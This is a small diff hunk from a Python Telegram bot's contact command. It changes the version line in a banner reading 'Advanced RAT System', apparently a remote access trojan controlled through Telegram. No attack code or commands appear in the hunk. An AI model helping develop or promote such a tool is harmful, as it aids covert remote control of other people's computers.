@@ -356,7 +356,7 @@ async def contact_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 ╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
 ┃    🚀 Advanced RAT System     ┃
-┃       Version 2.0 Elite       ┃
+┃       Version 1.2             ┃
 ╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
 """
     await update.message.reply_text(contact_info, disable_web_page_preview=True)
